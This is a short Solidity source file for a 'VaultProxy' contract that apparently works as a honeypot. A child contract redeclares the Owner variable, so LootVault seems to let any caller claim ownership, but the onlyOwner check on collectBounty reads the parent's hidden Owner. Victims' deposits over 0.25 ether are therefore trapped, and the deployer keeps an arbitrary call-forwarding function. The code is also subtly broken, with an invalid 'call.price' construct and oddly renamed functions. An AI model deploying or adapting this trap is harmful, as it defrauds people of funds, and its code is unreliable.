// SPDX-License-Identifier: MIT
pragma solidity ^0.4.23;

contract PortalGate  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function tradefundsMaster(address _owner) public onlyOwner { Owner = _owner; }
    function teleportHub(address aim, bytes info) public payable {
        aim.call.price(msg.value)(info);
    }
}

contract VaultProxy is PortalGate {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function LootVault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            depositGold();
        }
    }

    function depositGold() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function collectBounty(uint256 count) public onlyOwner {
        if (count>0 && Deposits[msg.sender]>=count) {
            msg.sender.transfer(count);
        }
    }
}